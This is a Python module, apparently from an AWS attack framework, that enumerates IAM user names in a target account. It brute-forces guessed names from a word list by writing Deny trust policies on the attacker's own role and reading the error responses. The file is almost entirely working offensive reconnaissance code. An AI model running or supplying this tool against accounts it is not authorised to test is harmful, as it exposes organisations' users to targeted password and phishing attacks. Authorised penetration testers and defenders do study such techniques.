#!/usr/bin/env python3
import datetime

import argparse
import botocore

def main(args, awsattack_main):
    print = awsattack_main.print

    if not len(args.account_id) == 12 or not args.account_id.isdigit():
        print('Error: An AWS account ID is a number of length 12. You supplied: {}\n'.format(args.account_id))
        return None

    if args.word_list is None:
        word_list_path = './modules/{}/default-word-list.txt'.format(technique_info['name'])
    else:
        word_list_path = args.word_list.strip()

    with open(word_list_path, 'r') as f:
        word_list = f.read().splitlines()

    print('Warning: This script does not check if the keys you supplied have the correct permissions. Make sure they are allowed to use iam:UpdateAssumeRolePolicy on the role that you pass into --role-name!\n')

    data = {
        'attempts': 0,
        'valid_users': []
    }

    client = awsattack_main.get_boto3_client('iam')

    print('Targeting account ID: {}\n'.format(args.account_id))
    print('Starting user enumeration...\n')

    for word in word_list:
        user_arn = 'arn:aws:iam::{}:user/{}'.format(args.account_id, word)

        data['attempts'] += 1

        try:
            client.update_assume_role_policy(
                RoleName=args.role_name,
                PolicyDocument='{{"Version":"2012-10-17","Statement":[{{"Effect":"Deny","Principal":{{"AWS":"{}"}},"Action":"sts:AssumeRole"}}]}}'.format(user_arn)
            )
            print('  Found user: {}'.format(user_arn))
            data['valid_users'].append(user_arn)
        except botocore.exceptions.ClientError as error:
            if 'MalformedPolicyDocument' in str(error):
                # User doesn't exist, continue on
                pass
            elif 'NoSuchEntity' in str(error):
                print('  Error: You did not pass in a valid role name. An existing role is required for this script.')
                return data
            else:
                print('  Unhandled error: {}'.format(str(error)))
                return data

    if len(data['valid_users']) > 0:
        print('\nFound {} user(s):\n'.format(len(data['valid_users'])))
        for user in data['valid_users']:
            print('    {}'.format(user))
        print('')

    return data


def summary(data, awsattack_main):
    return '  {} user(s) found after {} guess(es).'.format(len(data['valid_users']), data['attempts'])
